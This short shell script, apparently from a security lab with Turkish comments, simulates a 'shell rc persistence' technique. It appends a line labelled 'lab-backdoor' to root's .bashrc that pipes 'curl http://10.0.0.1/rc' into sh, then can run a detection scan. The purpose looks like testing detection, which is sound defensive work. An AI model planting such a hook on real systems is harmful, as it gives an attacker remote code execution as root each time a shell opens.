#!/bin/sh
# SHELL_RC_PERSISTENCE
# Doğrudan: sudo sh ./shellrc.sh
# Tarama:    GCLAB_RUN_SCAN=1 sudo sh ./shellrc.sh   veya   sudo sh ./shellrc.sh scan
. "$(cd "$(dirname "$0")" && pwd)/lib-env.sh"
set -e
printf '\n# lab-backdoor\ncurl -s http://10.0.0.1/rc | sh\n' >> /root/.bashrc

gclab_scan_if_requested "$@"
